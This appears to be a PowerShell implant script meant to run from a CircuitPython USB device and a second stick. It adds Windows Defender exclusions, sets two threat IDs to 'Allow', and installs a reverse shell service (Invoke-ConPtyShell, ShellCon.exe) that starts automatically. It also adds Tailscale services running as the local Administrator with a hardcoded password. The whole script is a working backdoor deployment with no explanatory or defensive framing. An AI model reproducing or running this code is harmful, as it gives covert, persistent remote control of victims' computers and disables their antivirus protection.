#threats to be allowed
$threat1 = "2147773719"
$threat2 = "2147780248"

#find CIRCUITPY drive and get Root directory:
try{$drive = (Get-Volume -FriendlyName CIRCUITPY -erroraction stop)}
catch{Write-Host "Couldn't find CIRCUITPY!"}
$root = $drive.DriveLetter + ":\"

#add Windows Defender Exclusions:
Add-MpPreference -ExclusionPath C:\Windows\Setup\State, C:\Windows\Setup\State\Setup.ps1, C:\Windows\Setup\State\Invoke-ConPtyShell.ps1, ($root + "Invoke-ConPtyShell.ps1")

#add Windows Defender allowed threats
Add-MpPreference -ThreatIDDefaultAction_Ids $threat1 -ThreatIDDefaultAction_Actions Allow -Force
Add-MpPreference -ThreatIDDefaultAction_Ids $threat2 -ThreatIDDefaultAction_Actions Allow -Force

#copy ShellCon service:
Copy-Item -Path ($root + "ShellCon.exe") -Destination "C:\Windows\Setup\State\ShellCon.exe"

#copy nssm.exe
Copy-Item -Path ($root + "nssm.exe") -Destination "C:\Windows\Setup\State\nssm.exe"

#copy connection script:
Copy-Item -Path ($root + "Invoke-ConPtyShell.ps1") -Destination "C:\Windows\Setup\State\Invoke-ConPtyShell.ps1"

#create Reverse Shell service:
$ServiceName = "ShellCon"
$ExecPath = "C:\Windows\Setup\State\ShellCon.exe"
$AppDirectory = "C:\Windows\Setup\State"

cd C:\Windows\Setup\State

./nssm install $ServiceName $ExecPath
./nssm set $ServiceName AppDirectory $AppDirectory
./nssm set $ServiceName Start SERVICE_AUTO_START
./nssm set $ServiceName AppStopMethodConsole 30000


#Get BDEF Stick drive:
try{$drive = (Get-Volume -FriendlyName BDEF -erroraction stop)}
catch{
  "Couldn't find BDEF Drive!"
  Read-Host -Prompt "`r`nPress Enter to exit"
  Exit
}
$tsc = ($drive.DriveLetter + ":\" + "tsc")

#copy tsc folder:
Copy-Item -Path $tsc -Destination C:\Windows\Setup\State\tsc -recurse -force

#create Tailscale service:
$ServiceName = "Tailscale"
$ExecPath = "C:\Windows\Setup\State\tsc\tailscaled.exe"
$AppDirectory = "C:\Windows\Setup\State\tsc"

./nssm install $ServiceName $ExecPath
./nssm set $ServiceName AppDirectory $AppDirectory
./nssm set $ServiceName Start SERVICE_AUTO_START
./nssm set $ServiceName AppStopMethodConsole 30000

#create Tailscale auto-log-in service:
$ServiceName = "tscStarter"
$ExecPath = "C:\Windows\Setup\State\tsc\tscStarter.exe"
$AppDirectory = "C:\Windows\Setup\State\tsc"

./nssm install $ServiceName $ExecPath
./nssm set $ServiceName AppDirectory $AppDirectory
./nssm set $ServiceName Start SERVICE_AUTO_START
./nssm set $ServiceName ObjectName .\Administrator 34Tehno12
./nssm set $ServiceName AppStopMethodConsole 30000

#Start both services:
Start-Service Tailscale
Start-Service tscStarter
Start-Service ShellCon
